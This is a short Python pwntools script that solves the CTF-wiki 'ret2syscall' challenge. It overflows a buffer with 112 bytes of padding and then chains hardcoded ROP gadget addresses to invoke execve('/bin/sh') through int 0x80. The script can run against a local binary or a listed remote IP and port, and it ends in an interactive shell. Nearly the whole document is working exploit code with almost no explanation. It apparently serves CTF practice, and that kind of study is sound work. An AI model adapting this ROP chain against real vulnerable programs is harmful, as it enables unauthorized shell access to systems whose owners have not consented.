from pwn import *
from misc import utils

local = 1

if __name__ == "__main__":
    """
    syscall: execve("/bin/sh",NULL,NULL)
    
    ROPgadget gadgets:
    ===============================================
    0x080bb196 : pop eax ; ret
    0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
    0x080be408 : /bin/sh
    0x08049421 : int 0x80
    """
    addr = '../../challenges/ctfwiki/ret2syscall'
    ip = '111.200.241.244:65037'
    r = None
    if not local:
        r = remote(ip.split(':')[0], int(ip.split(':')[1]))
    else:
        r = process([addr])

    pop_eax_ret = 0x080bb196
    pop_edx_ecx_ebx_ret = 0x0806eb90
    int_0x80 = 0x08049421
    binsh = 0x80be408

    payload = flat(112*b'A', pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80)

    r.sendline(payload)

    r.interactive()
